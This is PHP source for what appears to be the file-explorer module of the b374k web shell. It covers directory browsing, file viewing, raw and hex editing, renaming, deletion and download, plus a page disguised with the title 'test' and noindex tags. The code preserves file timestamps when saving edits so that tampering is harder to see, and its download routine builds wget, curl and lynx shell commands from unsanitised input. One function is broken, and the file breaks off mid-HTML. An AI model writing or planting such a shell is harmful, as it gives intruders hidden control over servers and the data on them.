<?php
$GLOBALS['module_to_load'] = array("explorer");

@ob_start();
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','1');
@ini_set('display_startup_errors','1');
@ini_set('log_errors','0');
@set_time_limit(0);
@clearstatcache();

if(!function_exists('getSelf')){
	function getSelf(){
		$query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:"";
		return html_safe($_SERVER["REQUEST_URI"].$query);
	}
}

if(!function_exists('get_post')){
	function get_post(){
		return fix_magic_quote($_POST);
	}
}

if(!function_exists('get_nav')){
	function getNav($path){
		return parse_dir($path);
	}
}

if(!function_exists('get_cwd')){
	function get_cwd(){
		$cwd = getcwd().DIRECTORY_SEPARATOR;
		if(!isset($_COOKIE['cwd'])){
			setcookie("cwd", $cwd);
		}
		else{
			$cwd_c = rawurldecode($_COOKIE['cwd']);
			if(is_dir($cwd_c)) $cwd = realpath($cwd_c).DIRECTORY_SEPARATOR;
			else setcookie("cwd", $cwd);
		}
		return $cwd;
	}
}
if(!function_exists('get_resource')){
	function get_resource($type){
		if(isset($GLOBALS['resources'][$type])){
			return gzinflate(base64_decode($GLOBALS['resources'][$type]));
		}
		return false;
	}
}

if(!function_exists('is_win')){
	function is_win(){
		return (strtolower(substr(php_uname(),0,3)) == "win")? true : false;
	}
}

if(!function_exists('fix_magic_quote')){
	function fix_magic_quote($arr){
		$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
		if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){
			if(is_array($arr)){
				foreach($arr as $k=>$v){
					if(is_array($v)) $arr[$k] = clean($v);
					else $arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off')? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v));
				}
			}
		}
		return $arr;
	}
}

if(!function_exists('html_safe')){
	function html_safe($str){
		return htmlspecialchars($str, 2 | 1);
	}
}

if(!function_exists('parse_dir')){
	function parse_dir($path){
		$path = realpath($path).DIRECTORY_SEPARATOR;
		$paths = explode(DIRECTORY_SEPARATOR, $path);
		$res = "";
		for($i = 0; $i < sizeof($paths)-1; $i++){
			$x = "";
			for($j = 0; $j <= $i; $j++) $x .= $paths[$j].DIRECTORY_SEPARATOR;
			$res .= "<a class='navbar' data-path='".html_safe($x)."'>".html_safe($paths[$i])." ".DIRECTORY_SEPARATOR." </a>";
		}
		
		return trim($res);
	}
}
if(!function_exists('download')){
	function download($url ,$saveas){
		if(!preg_match("/[a-z]+:\/\/.+/",$url)) return false;
		$filename = basename($url);

		if($content = read_file($url)){
			if(is_file($saveas)) unlink($saveas);
			if(write_file($saveas, $content)){
				return true;
			}
		}

		$buff = execute("wget ".$url." -O ".$saveas);
		if(is_file($saveas)) return true;

		$buff = execute("curl ".$url." -o ".$saveas);
		if(is_file($saveas)) return true;

		$buff = execute("lwp-download ".$url." ".$saveas);
		if(is_file($saveas)) return true;

		$buff = execute("lynx -source ".$url." > ".$saveas);
		if(is_file($saveas)) return true;

		return false;
	}
}

if(!function_exists('getFileperms')){
	function getFileperms($file){
		if($perms = @fileperms($file)){
			$flag = 'u';
			if(($perms & 0xC000) == 0xC000)$flag = 's';
			elseif(($perms & 0xA000) == 0xA000)$flag = 'l';
			elseif(($perms & 0x8000) == 0x8000)$flag = '-';
			elseif(($perms & 0x6000) == 0x6000)$flag = 'b';
			elseif(($perms & 0x4000) == 0x4000)$flag = 'd';
			elseif(($perms & 0x2000) == 0x2000)$flag = 'c';
			elseif(($perms & 0x1000) == 0x1000)$flag = 'p';
			$flag .= ($perms & 00400)? 'r':'-';
			$flag .= ($perms & 00200)? 'w':'-';
			$flag .= ($perms & 00100)? 'x':'-';
			$flag .= ($perms & 00040)? 'r':'-';
			$flag .= ($perms & 00020)? 'w':'-';
			$flag .= ($perms & 00010)? 'x':'-';
			$flag .= ($perms & 00004)? 'r':'-';
			$flag .= ($perms & 00002)? 'w':'-';
			$flag .= ($perms & 00001)? 'x':'-';
			return $flag;
		}
		else return "???????????";
	}
}

if(!function_exists('format_bit')){
	function format_bit($size){
		$base = log($size) / log(1024);
		$suffixes = array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
		return round(pow(1024, $base - floor($base)),2)." ".$suffixes[floor($base)];
	}
}

if(!function_exists('get_filesize')){
	function get_filesize($file){
		$size = @filesize($file);
		if($size!==false){
			if($size<=0) return 0;
			return format_bit($size);
		}
		else return "???";
	}
}

if(!function_exists('getFiletime')){
	function getFiletime($file){
		return @date("d-M-Y H:i:s", filemtime($file));
	}
}

if(!function_exists('getFileowner')){
	function getFileowner($file){
		$owner = "?:?";
		if(function_exists("posix_getpwuid")){
			$name = posix_getpwuid(fileowner($file));
			$group = posix_getgrgid(filegroup($file));
			$owner = $name['name'].":".$group['name'];
		}
		return $owner;
	}
}

if(!function_exists('rmdirs')){
	function rmdirs($dir, $counter = 0){
		if(is_dir($dir)) $dir = realpath($dir).DIRECTORY_SEPARATOR;
		if($dh = opendir($dir)){
			while(($f = readdir($dh))!==false){
				if(($f!='.')&&($f!='..')){
					$f = $dir.$f;
					if(@is_dir($f)) $counter += rmdirs($f);
					else{
						if(unlink($f)) $counter++;
					}
				}
			}
			closedir($dh);
			if(rmdir($dir)) $counter++;;
		}
		return $counter;
	}
}

if(!function_exists('copys')){
	function copys($source , $target ,$c=0){
		$source = realpath($source).DIRECTORY_SEPARATOR;
		if($dh = opendir($source)){
			if(!is_dir($target)) mkdir($target);
			$target = realpath($target).DIRECTORY_SEPARATOR;

			while(($f = readdir($dh))!==false){
				if(($f!='.')&&($f!='..')){
					if(is_dir($source.$f)){
						copys($source.$f, $target.$f, $c);
					}
					else{
						if(copy($source.$f, $target.$f)) $c++;
					}
				}
			}
			closedir($dh);
		}
		return $c;
	}
}

if(!function_exists('get_all_files')){
	function get_all_files($path){
		$path = realpath($path).DIRECTORY_SEPARATOR;
		$files = glob($path.'*');
		for($i = 0; $i<count($files); $i++){
			if(is_dir($files[$i])){
				$subdir = glob($files[$i].DIRECTORY_SEPARATOR.'*');
				if(is_array($files) && is_array($subdir)) $files = array_merge($files, $subdir);
			}
		}
		return $files;
	}
}

if(!function_exists('read_file')){
	function read_file($file){
		$content = false;
		if($fh = @fopen($file, "rb")){
			$content = "";
			while(!feof($fh)){
				$content .= fread($fh, 8192);
			}
		}
		return $content;
	}
}

if(!function_exists('write_file')){
	function write_file($file, $content){
		if($fh = @fopen($file, "wb")){
			if(fwrite($fh, $content)!==false) return true;
		}
		return false;
	}
}

if(!function_exists('view_file')){
	function view_file($file, $type, $preserveTimestamp='true'){
		$output = "";
		if(is_file($file)){
			$dir = dirname($file);

			$owner = "";
			if(!is_win()){
				$owner = "<tr><td>Owner</td><td>".getFileowner($file)."</td></tr>";
			}

			$image_info = @getimagesize($file);
			$mime_list = get_resource('mime');
			$mime = "";
			$file_ext_pos = strrpos($file, ".");
			if($file_ext_pos!==false){
				$file_ext = trim(substr($file, $file_ext_pos),".");
				if(preg_match("/([^\s]+)\ .*\b".$file_ext."\b.*/i", $mime_list, $res)){
					$mime = $res[1];
				}
			}
			if($type=="auto"){
				if(is_array($image_info)) $type = 'image';
				//elseif(strtolower(substr($file,-3,3)) == "php") $type = "code";
				elseif(!empty($mime)) $type = "multimedia";
				else $type = "raw";
			}

			$content = "";
			if($type=="code"){
				$hl_arr = array(
					"hl_default"=> ini_get('highlight.default'),
					"hl_keyword"=> ini_get('highlight.keyword'),
					"hl_string"=> ini_get('highlight.string'),
					"hl_html"=> ini_get('highlight.html'),
					"hl_comment"=> ini_get('highlight.comment')
				);
				
				
				$content = highlight_string(read_file($file),true);
				foreach($hl_arr as $k=>$v){
					$content = str_replace("<font color=\"".$v."\">", "<font class='".$k."'>", $content);
					$content = str_replace("<span style=\"color: ".$v."\">", "<span class='".$k."'>", $content);
				}
			}
			elseif($type=="image"){
				$width = (int) $image_info[0];
				$height = (int) $image_info[1];
				$image_info_h = "Image type = <span class='strong'>(</span> ".$image_info['mime']." <span class='strong'>)</span><br>
				Image Size = <span class='strong'>( </span>".$width." x ".$height."<span class='strong'> )</span><br>";
				if($width > 800){
					$width = 800;
					$imglink = "<p><a id='viewFullsize'>
					<span class='strong'>[ </span>View Full Size<span class='strong'> ]</span></a></p>";
				}
				else $imglink = "";

				$content = "<center>".$image_info_h."<br>".$imglink."
				<img id='viewImage' style='width:".$width."px;' src='data:".$image_info['mime'].";base64,".base64_encode(read_file($file))."' alt='".$file."'></center>
				";

			}
			elseif($type=="multimedia"){
				$content = "<center>
				<video controls>
				<source src='' type='".$mime."'>

				</video>
				<p><span class='button' onclick=\"multimedia('".html_safe(addslashes($file))."');\">Load Multimedia File</span></p>
				</center>";
			}
			elseif($type=="edit"){
				$preservecbox = ($preserveTimestamp=='true')? " cBoxSelected":"";
				$content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='".html_safe($file)."' onkeydown=\"trap_enter(event, 'edit_save_raw');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_raw();\">save</span></td><td style='vertical-align:middle;'><div class='cBox".$preservecbox."'></div><span>preserve modification timestamp</span><span id='editResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_raw');\">".html_safe(read_file($file))."</textarea></td></tr></table>";
			}
			elseif($type=="hex"){
				$preservecbox = ($preserveTimestamp=='true')? " cBoxSelected":"";
				$content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='".html_safe($file)."' onkeydown=\"trap_enter(event, 'edit_save_hex');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_hex();\">save</span></td><td style='vertical-align:middle;'><div class='cBox".$preservecbox."'></div><span>preserve modification timestamp</span><span id='editHexResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_hex');\">".bin2hex(read_file($file))."</textarea></td></tr></table>";
			}
			else $content = "<pre>".html_safe(read_file($file))."</pre>";



			$output .= "
			<table id='viewFile' class='boxtbl'>
			<tr><td style='width:120px;'>Filename</td><td>".html_safe($file)."</td></tr>
			<tr><td>Size</td><td>".get_filesize($file)." (".filesize($file).")</td></tr>
			".$owner."
			<tr><td>Permission</td><td>".getFileperms($file)."</td></tr>
			<tr><td>Create time</td><td>".@date("d-M-Y H:i:s",filectime($file))."</td></tr>
			<tr><td>Last modified</td><td>".@date("d-M-Y H:i:s",filemtime($file))."</td></tr>
			<tr><td>Last accessed</td><td>".@date("d-M-Y H:i:s",fileatime($file))."</td></tr>
			<tr data-path='".html_safe($file)."'><td colspan='2'>
			<span class='navigate button' style='width:120px;'>explorer</span>
			<span class='action button' style='width:120px;'>action</span>
			<span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'raw');hide_box();\">raw</span>
			<span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'code');hide_box();\">code</span>
			<span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'hex');hide_box();\">hex</span>
			<span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'image');hide_box();\">image</span>
			<span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'multimedia');hide_box();\">multimedia</span>
			</td></tr>
			<tr><td colspan='2'><div id='viewFilecontent'>".$content."</div></td></tr>
			</table>";


		}
		else $output = "error";
		return $output;
	}
}


if (!function_exists("listFiles")) {
	function listFiles($cwd, $type ) {
		$result = [];
		foreach (scandir($cwd) as $key => $value) {
			$file["path"] = $cwd . DIRECTORY_SEPARATOR . $value;
			$file = 
			[
                $file["path"], // full path
                $value // single path
            ];

            switch ($type) {
            	case "all":
            	if (is_dir($file[0]) || $file[1] === "." || $file[1] === "..") {
            		$result[] = $file;
            		continue 2;
            	}
            	break;

            	case "dir":
            	if (!is_dir($file[0]) || $file[1] === "." || $file[1] === "..") continue 2;
            	break;

            	case "file":
            	if (!is_file($file[0])) continue 2;
            	break;
            } $result[] = $file;
        } return $result;
    }
}

if (!function_exists("showFiles")) {
	function showFiles()
	{
		$finfo = array();
		if (is_win()) {
			$finfo = array(
							"perms" => "getFileperms",
							"modified" => "getFiletime"
						);
		} else {
			$finfo = array(
							"owner"=>"getFileowner",
							"perms"=>"getFileperms",
							"modified"=>"getFiletime"
						);
		}
		$output .= "<table id='xplTable' class='dataView sortable'><thead>";
		$output .= "<tr>
						<th class='col-cbox sorttable_nosort'>
							<div class='cBoxAll'></div>
						</th>
						<th class='col-name'>name</th>
						<th class='col-size'>size</th>";
		foreach ($finfo as $key => $value) {
			$output .= "<th class='col-".$key."'>".$key."</th>";
		}
		$output .= "</tr></thead><tbody>";

		foreach (listFiles(get_cwd(), "dir") as $key => $value) {
			$output .= "<td style='white-space:normal;'>
							<a class='navigate'>".html_safe($d)."</a>
							<span class='".$action." floatRight'>action</span>
						</td>
						<td>DIR</td>";
			foreach ($finfo as $key => $values) {
				$sortable = "";
				if ($key == "modified") $sortable = " title='" .filemtime($value). "'";
				$output .= "<td" .$sortable. ">" .$values($value). "</td>";
			}
			$output .= "</tr>";
		}
	}
}

if(!function_exists('show_all_files')){
	function show_all_files($path){
		if(!is_dir($path)) return "No such directory : ".$path;
		chdir($path);
		$output = "";
		$allfiles = $allfolders = array();
		if($res = opendir($path)){
			while($file = readdir($res)){
				if(($file!='.')&&($file!="..")){
					if(is_dir($file)) $allfolders[] = $file;
					elseif(is_file($file))$allfiles[] = $file;
				}
			}
		}

		array_unshift($allfolders, ".");
		$cur = getcwd();
		chdir("..");
		if(getcwd()!=$cur) array_unshift($allfolders, "..");
		chdir($cur);

		natcasesort($allfolders);
		natcasesort($allfiles);

		$cols = array();
		if(is_win()){
			$cols = array(
				"perms"=>"getFileperms",
				"modified"=>"getFiletime"
			);
		}
		else{
			$cols = array(
				"owner"=>"getFileowner",
				"perms"=>"getFileperms",
				"modified"=>"getFiletime"
			);
		}

		$totalFiles = count($allfiles);
		$totalFolders = 0;

		$output .= "<table id='xplTable' class='dataView sortable'><thead>";
		$output .= "<tr><th class='col-cbox sorttable_nosort'><div class='cBoxAll'></div></th><th class='col-name'>name</th><th class='col-size'>size</th>";

		foreach($cols as $k=>$v){
			$output .= "<th class='col-".$k."'>".$k."</th>";
		}
		$output .= "</tr></thead><tbody>";

		foreach($allfolders as $d){
			$cboxException = "";
			if(($d==".")||($d=="..")){
				$action = "actiondot";
				$cboxException = " cBoxException";
			}
			else{
				$action = "actionfolder";
				$totalFolders++;
			}
			$output .= "
			<tr data-path=\"".html_safe(realpath($d).DIRECTORY_SEPARATOR)."\"><td><div class='cBox".$cboxException."'></div></td>
			<td style='white-space:normal;'><a class='navigate'>[ ".html_safe($d)." ]</a><span class='".$action." floatRight'>action</span></td>
			<td>DIR</td>";
			foreach($cols as $k=>$v){
				$sortable = "";
				if($k=='modified') $sortable = " title='".filemtime($d)."'";
				$output .= "<td".$sortable.">".$v($d)."</td>";
			}
			$output .= "</tr>";
		}
		foreach($allfiles as $f){
			$output .= "
			<tr data-path=\"".html_safe(realpath($f))."\"><td><div class='cBox'></div></td>
			<td style='white-space:normal;'><a class='view'>".html_safe($f)."</a><span class='action floatRight'>action</span></td>
			<td title='".filesize($f)."'>".get_filesize($f)."</td>";
			foreach($cols as $k=>$v){
				$sortable = "";
				if($k=='modified') $sortable = " title='".filemtime($f)."'";
				$output .= "<td".$sortable.">".$v($f)."</td>";
			}
			$output .= "</tr>";
		}
		$output .= "</tbody><tfoot>";

		$colspan = 1 + count($cols);
		$output .= "<tr><td><div class='cBoxAll'></div></td><td>
		<select id='massAction' class='colSpan'>
		<option disabled selected>Action</option>
		<option>cut</option>
		<option>copy</option>
		<option>paste</option>
		<option>delete</option>
		<option disabled>------------</option>
		<option>chmod</option>
		<option>chown</option>
		<option>touch</option>
		<option disabled>------------</option>
		<option>extract (tar)</option>
		<option>extract (tar.gz)</option>
		<option>extract (zip)</option>
		<option disabled>------------</option>
		<option>compress (tar)</option>
		<option>compress (tar.gz)</option>
		<option>compress (zip)</option>
		<option disabled>------------</option>
		</select>
		</td><td colspan='".$colspan."'></td></tr>
		<tr><td></td><td colspan='".++$colspan."'>".$totalFiles." file(s), ".$totalFolders." Folder(s)<span class='xplSelected'></span></td></tr>
		";
		$output .= "</tfoot></table>";
		return $output;
	}
}
if(!function_exists('output')){
	function output($str){
		$error = @ob_get_contents();
		@ob_end_clean();
		header("Content-Type: text/plain");
		header("Cache-Control: no-cache");
		header("Pragma: no-cache");
		echo $str;
		die();
	}
}
chdir(get_cwd());
$nav = getNav(get_cwd());
$p = array_map("rawurldecode", get_post());
$cwd = html_safe(get_cwd());
$GLOBALS['module'] = array();

$explorer_content = "";
if(isset($p['viewEntry'])){
	$path = trim($p['viewEntry']);
	if(is_file($path)){
		$dirname = realpath(dirname($path)).DIRECTORY_SEPARATOR;
		setcookie("cwd", $dirname);
		chdir($dirname);
		$nav = getNav($dirname);
		$cwd = html_safe($dirname);
		$explorer_content = view_file($path, "auto");
	}
	elseif(is_dir($path)){
		$path = realpath($path).DIRECTORY_SEPARATOR;
		setcookie("cwd", $path);
		chdir($path);
		$nav = getNav($path);
		$cwd = html_safe($path);
		$explorer_content = show_all_files($path);
	}
}
else $explorer_content = show_all_files(get_cwd());

$GLOBALS['module']['explorer']['id'] = "explorer";
$GLOBALS['module']['explorer']['title'] = "Explorer";
$GLOBALS['module']['explorer']['js_ontabselected'] = "";
$GLOBALS['module']['explorer']['content'] = $explorer_content;


$res = "";
if(isset($p['cd'])){
	$path = $p['cd'];
	if(trim($path)=='') $path = dirname(__FILE__);

	$path = realpath($path);
	if(is_file($path)) $path = dirname($path);
	if(is_dir($path)){
		chdir($path);
		$path = $path.DIRECTORY_SEPARATOR;
		setcookie("cwd", $path);
		$res = $path."{[|b374k|]}".getNav($path)."{[|b374k|]}";
		if(isset($p['showfiles'])&&($p['showfiles']=='true')){
			$res .= show_all_files($path);
		}
	}
	else $res = "error";
	output($res);
}
elseif(isset($p['viewFile']) && isset($p['viewType'])){
	$path = trim($p['viewFile']);
	$type = trim($p['viewType']);
	$preserveTimestamp = trim($p['preserveTimestamp']);
	if(is_file($path)){
		$res = view_file($path, $type, $preserveTimestamp);
	}
	else $res = "error";
	output($res);
}
elseif(isset($p['renameFile']) && isset($p['renameFileTo'])){
	$renameFile = trim($p['renameFile']);
	$renameFileTo = trim($p['renameFileTo']);
	if(file_exists($renameFile)){
		if(rename($renameFile, $renameFileTo)){
			$res = dirname($renameFileTo);
		}
		else $res = "error";
	}
	else $res = "error";
	output($res);
}
elseif(isset($p['newFolder'])){
	$newFolder = trim($p['newFolder']);
	if(mkdir($newFolder)){
		$res = dirname($newFolder);
	}
	else $res = "error";
	output($res);
}
elseif(isset($p['newFile'])){
	$newFile = trim($p['newFile']);
	if(touch($newFile)){
		$res = dirname($newFile);
	}
	else $res = "error";
	output($res);
}
elseif(isset($p['delete'])){
	$path = trim($p['delete']);
	$dirname = dirname($path);
	if(is_file($path)){
		if(unlink($path)) $res = $dirname;
	}
	elseif(is_dir($path)){
		if(rmdirs($path)>0) $res = $dirname;
	}
	else $res = "error";
	if(file_exists($path)) $res = "error";
	output($res);
}
elseif(isset($p['editType'])&&isset($p['editFilename'])&&isset($p['editInput'])&&isset($p['preserveTimestamp'])){
	$editFilename = trim($p['editFilename']);
	$editInput = trim($p['editInput']);
	$editType = trim($p['editType']);
	$preserveTimestamp = trim($p['preserveTimestamp']);
	$time = filemtime($editFilename);
	if($editType=='hex') $editInput = pack("H*" , preg_replace("/\s/","", $editInput));
	if(write_file($editFilename, $editInput)){
		$res = $editFilename;
		if($preserveTimestamp=='true') touch($editFilename, $time);
	}
	else $res = "error";
	output($res);
}


elseif(isset($p['download'])){
	$file = trim($p['download']);
	if(is_file($file)){
		header("Content-Type: application/octet-stream");
		header('Content-Transfer-Encoding: binary');
		header("Content-length: ".filesize($file));
		header("Cache-Control: no-cache");
		header("Pragma: no-cache");
		header("Content-disposition: attachment; filename=\"".basename($file)."\";");
		$handler = fopen($file,"rb");
		while(!feof($handler)){
			print(fread($handler, 1024*8));
			@ob_flush();
			@flush();
		}
		fclose($handler);
		die();
	}
}
elseif(isset($p['viewFileorFolder'])){
	$entry = $p['viewFileorFolder'];
	if(is_file($entry)) output('file');
	elseif(is_dir($entry)) output('folder');
	output('error');
}

if(!function_exists('decode')){
	function decode($str){
		$res = "";
		$length = (int) strlen($str);

		$res .= decode_line("md5", md5($str), "input");
		$res .= decode_line("sha1", sha1($str), "input");

		$res .= decode_line("base64 encode", base64_encode($str), "textarea");
		$res .= decode_line("base64 decode", base64_decode($str), "textarea");


		$res .= decode_line("hex to string", @pack("H*" , $str), "textarea");
		$res .= decode_line("string to hex", bin2hex($str), "textarea");

		$ascii = "";
		for($i=0; $i<$length; $i++){
			$ascii .= ord(substr($str,$i,1))." ";
		}
		$res .= decode_line("ascii char", trim($ascii), "textarea");

		$res .= decode_line("reversed", strrev($str), "textarea");
		$res .= decode_line("lowercase", strtolower($str), "textarea");
		$res .= decode_line("uppercase", strtoupper($str), "textarea");

		$res .= decode_line("urlencode", urlencode($str), "textarea");
		$res .= decode_line("urldecode", urldecode($str), "textarea");
		$res .= decode_line("rawurlencode", rawurlencode($str), "textarea");
		$res .= decode_line("rawurldecode", rawurldecode($str), "textarea");

		$res .= decode_line("htmlentities", html_safe($str), "textarea");

		if(function_exists('hash_algos')){
			$algos = hash_algos();
			foreach($algos as $algo){
				if(($algo=='md5')||($algo=='sha1')) continue;
				$res .= decode_line($algo, hash($algo, $str), "input");
			}
		}

		return $res;
	}
}

if(!function_exists('decode_line')){
	function decode_line($type, $result, $inputtype){
		$res = "<tr><td class='colFit'>".$type."</td><td>";
		if($inputtype=='input'){
			$res .= "<input type='text' value='".html_safe($result)."' ondblclick='this.select();'>";
		}
		else{
			$res .= "<textarea style='height:80px;min-height:80px;' ondblclick='this.select();'>".html_safe($result)."</textarea>";
		}
		return $res;
	}
}

?><!doctype html>
	<html>
	<head>
		<title>test</title>
		<meta charset='utf-8'>
		<meta name='robots' content='noindex, nofollow, noarchive'>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0">
		<style type="text/css">
			*{
				margin:0;
				padding:0;
				border:0;
				-webkit-box-sizing:border-box;
				-moz-box-sizing:border-box;
				box-sizing:border-box;
				font-size:12px;
				font-weight:normal;
			}
			input:focus, select:focus, textarea:focus, button:focus{
				outline:none;
			}
			html, body{
				width:100%;
				height:100%;
				color:#222222;
			}
			body{
				background:#f0f0f0;
				line-height:17px;
			}
			a{
				text-decoration:none;
				color:#000000;
			}
			a:hover{
				cursor:pointer;
			}
			p{
				padding:8px 0;
			}
			img{
				vertical-align:middle;
			}
			table{
				width:100%;
			}
			table td, table th{
				vertical-align:middle;
				padding:8px;
			}
			textarea, input, select{
				background:#ffffff;
				padding:8px;
				border-radius:8px;
				color:#111111;
				border:1px solid #dddddd;
			}
			textarea{
				resize:vertical;
				width:100%;
				height:300px;
				min-height:300px;
				max-width:100%;
				min-width:100%;
			}
			hr{
				margin:8px 0;
				border-bottom:1px dashed #dddddd;
			}
			video{
				width:100%;
				background:#222222;
				border-radius:8px;
			}
			h1, h2{
				background:#E7E7E7;
				border-bottom: 1px solid #cccccc;
				color:#000000;
				border-radius:8px;
				text-align:center;
				cursor:pointer;
				padding:8px;
				margin-bottom:8px;
			}
			h1 a, h2 a{
				color:#000000;
			}
			pre, #viewFilecontent{
				word-break:break-all;
				word-wrap:break-word;
			}
			pre{
				white-space:pre-wrap;
			}
			#b374k{
				cursor:pointer;
			}
			#header{
				width:100%;
				position:fixed;
			}
			#headerNav{
				padding:10px 8px 6px 8px;
				background:#333333;
			}
			#headerNav img{
				margin:0 4px;
			}
			#headerNav a{
				color:#efefef;
			}
			#menu{
				background:#7C94A8;
				height:33px;
				border-bottom:3px solid #CCCFD1;
			}
			#menu .menuitem{
				padding:7px 12px 6px 12px;
				float:left;
				height:30px;
				background:#7C94A8;
				color:#ffffff;
				cursor:pointer;
			}
			#menu .menuitem:hover, #menu .menuitemSelected{
				background:#768999;
				color:#ffffff;
			}
			#menu .menuitemSelected{
				background:#768999;
			}
			#basicInfo{
				width:100%;
				padding:8px;
				border-bottom:1px dashed #dddddd;
			}
			#content{
				background:#f0f0f0;
				height:100%;
				padding:66px 8px 8px 8px;
			}
			#content .menucontent{
				background:#f0f0f0;
				clear:both;
				display:none;
				padding:8px;
				overflow-x:auto;
				overflow-y:hidden;
			}
			#overlay{
				position:fixed;
				top:0px;
				left:0px;
				width:100%;
				height:100%;
				display:none;
			}
			#loading{
				width:64px;
				height:64px;
				background:#7C94A8;
				border-radius:32px 0 32px 0;
				margin:auto;
				vertical-align:middle;
			}
			#ulDragNDrop{
				padding:32px 0;
				text-align:center;
				background:#7C94A8;
				border-radius:8px;
				color:#ebebeb;
			}
			#form{
				display:none;
			}
			#devTitle{
				background:#ebebeb;
			}
			.box{
				min-width:50%;
				border:1px solid #dddddd;
				padding:8px 8px 0 8px;
				border-radius:8px;
				position:fixed;
				background:#ebebeb;
				opacity:1;
				box-shadow:1px 1px 25px #150f0f;
				opacity:0.98;
			}
			.boxtitle{
				background:#dddddd;
				border: 1px solid #cccccc;
				color:#000000;
				border-radius:8px;
				text-align:center;
				cursor:pointer;
			}
			.boxtitle a, .boxtitle a:hover{
				color:#000000;
			}
			.boxcontent{
				padding:2px 0 2px 0;
			}
			.boxresult{
				padding:4px 10px 6px 10px;
				border-top:1px solid #dddddd;
				margin-top:4px;
				text-align:center;
			}
			.boxtbl{
				border:1px solid #dddddd;
				border-radius:8px;
				padding-bottom:8px;
				background:#ebebeb;
			}
			.boxtbl td{
				vertical-align:middle;
				padding:8px 15px;
				border-bottom:1px dashed #dddddd;
			}
			.boxtbl input, .boxtbl select, .boxtbl .button{
				width:100%;
			}
			.boxlabel{
				text-align: center;
				border-bottom:1px solid #dddddd;
				padding-bottom:8px;
			}
			.boxclose{
				background:#222222;
				border-radius:3px;
				margin-right:8px;
				margin-top:-3px;
				padding:2px 8px;
				cursor:pointer;
				color:#ffffff;
			}
			.strong{
				color:#7C94A8;
				text-shadow:0px 0px 1px #C0DCF5;
			}
			.weak{
				color:#666666;
			}
			.button{
				min-width:120px;
				width:120px;
				margin:2px;
				color:#ffffff;
				background:#7C94A8;
				border:none;
				padding:8px;
				border-radius:8px;
				display:block;
				text-align:center;
				float:left;
				cursor:pointer;
			}
			.button:hover, #ulDragNDrop:hover{
				background:#768999;
			}
			.floatLeft{
				float:left;
			}
			.floatRight{
				float:right;
			}
			.colFit{
				width:1px;
				white-space:nowrap;
			}
			.colSpan{
				width:100%;
			}
			.border{
				border:1px solid #dddddd;
				background:#ebebeb;
				border-radius:8px;
				padding:8px;
			}
			.borderbottom{
				border-bottom:1px dashed #dddddd;
			}
			.borderright{
				border-right:1px dashed #dddddd;
			}
			.borderleft{
				border-left:1px dashed #dddddd;
			}
			.hr td{
				border-bottom:1px dashed #dddddd;
			}
			.cBox, .cBoxAll{
				width:10px;
				height:10px;
				border:1px solid #7C94A8;
				border-radius:5px;
				margin:auto;
				float:left;
				margin:3px 6px 2px 6px;
				cursor:pointer;
			}
			.cBoxSelected{
				background:#7C94A8;
			}
			.action, .actionfolder, .actiondot{
				cursor:pointer;
			}
			.phpError{
				padding:8px;
				margin:8px 0;
				text-align:center;
			}
			.dataView td, .dataView th, #viewFile td{
				vertical-align:top;
				border-bottom:1px dashed #dddddd;
			}
			.dataView tbody tr:hover{
				background:#ebebeb;
			}
			.dataView th{
				vertical-align:middle;
				border-bottom:0;
				background:#e0e0e0;
			}
			.dataView tfoot td{
				vertical-align:middle;
			}
			.dataView .col-cbox{
				text-align:center;
				width:20px;
			}
			.dataView .col-size{
				width:70px;
			}
			#xplTable tr>td:nth-child(3){
				text-align:left;
			}
			#xplTable tr>td:nth-child(4),#xplTable tr>td:nth-child(5),#xplTable tr>td:nth-child(6){
				text-align:center;
			}
			.dataView .col-owner{
				width:140px;
				min-width:140px;
				text-align:center;
			}
			.dataView .col-perms{
				width:80px;
				text-align:center;
			}
			.dataView .col-modified{
				width:150px;
				text-align:center;
			}
			.sortable th{
				cursor:pointer;
			}
			#xplTable td{
				white-space:nowrap;
			}
			#viewFile td{
				text-align:left;
			}
			#viewFilecontent{
				padding:8px;
				border:1px solid #dddddd;
				border-radius:8px;
			}
			#terminalPrompt td{
				padding:0;
			}
			#terminalInput{
				background:none;
				border:none;
				padding:0;
				width:100%;
			}
			#evalAdditional{
				display:none;
			}
			.hl_default{
				color:#517797;
			}
			.hl_keyword{
				color:#00BB00;
			}
			.hl_string{
				color:#000000;
			}
			.hl_html{
				color:#CE5403;
			}
			.hl_comment{
				color:#7F9F7F;
			}
			#navigation{position:fixed;left:-16px;top:46%;}
			#totop,#tobottom,#toggleBasicInfo{background:url('<?php echo get_resource('arrow');?>');width:32px;height:32px;opacity:0.30;margin:18px 0;cursor:pointer;}
			#totop:hover,#tobottom:hover{opacity:0.80;}
			#toggleBasicInfo{display:none;float:right;margin:0;}
			#basicInfoSplitter{display:none;}
			#tobottom{-webkit-transform:scaleY(-1);-moz-transform:scaleY(-1);-o-transform:scaleY(-1);transform:scaleY(-1);filter:FlipV;-ms-filter:"FlipV";}
			#showinfo{float:right;display:none;}
			#logout{float:right;}
		</style>
	</head>
	<body>
		<!--wrapper start-->
		<div id='wrapper'>
			<!--header start-->
			<div id='header'>
				<!--header info start-->
				<div id='headerNav'>
